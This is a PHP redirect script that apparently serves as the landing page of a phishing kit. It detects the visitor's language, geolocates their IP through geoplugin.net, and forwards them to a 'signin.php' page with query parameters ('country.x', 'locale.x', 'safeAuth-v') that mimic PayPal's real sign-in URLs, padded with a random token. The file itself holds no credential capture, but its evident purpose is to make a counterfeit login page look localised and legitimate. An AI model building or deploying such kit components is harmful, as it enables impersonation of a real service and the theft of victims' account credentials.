<?php
@session_start();

// Detect Browser Language !
$language = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);


switch ($language){
    case "fr": $lang = "fr";
		break;	
    case "it":
        $lang= "it";
        break;
    case "en":
        $lang= "en";
        break;  
	case "de":
        $lang= "de";
        break;
	case "br":
        $lang= "br";
        break;  
	case "es":
	    $lang = "es";
		break;
	case "nl":$lang = "nl";
		break;
		case "se": $lang = "se";
		break;
	case "ch": $lang = "ch";
		break;
	case "il": $lang = "il";
		break;
	case "jp": $lang = "jp";
		break;
	case "tr": $lang = "tr";
		break;
			case "no": $lang = "no";
		break;	
		case "da": $lang = "da";
		break;	
    default:
        $lang= "en";
        break;
}
$_SESSION['_lang_'] = $lang;

function URLSTRING($length= 20) {
    $code = '0123456789PAYREB3L-GAFSI&WRASI_EGOSOUKENRABIPAL';
    $stringo= '';
    for ($i = 0; $i < $length; $i++) {
        $stringo.= $code[rand(0, strlen($code) - 1)];
    }
    RETURN $stringo;
}
$DOS = URLSTRING('40');

// Country & CountryCODE 
	
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryCode != null)
    {
        $countrycode = $ip_data->geoplugin_countryCode;
        $_SESSION['cntyCode'] = $countrycode;
    }
    
    $ip_data2 = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data2 && $ip_data2->geoplugin_countryName != null)
    {
        $countryname = $ip_data2->geoplugin_countryName;
        $_SESSION['cntyName'] = $countryname;
    }
	
    header("location:signin.php?country.x=".$countrycode."&locale.x=".$_SESSION['_lang_']."_".$countrycode."&safeAuth-v= ".$DOS."");
?>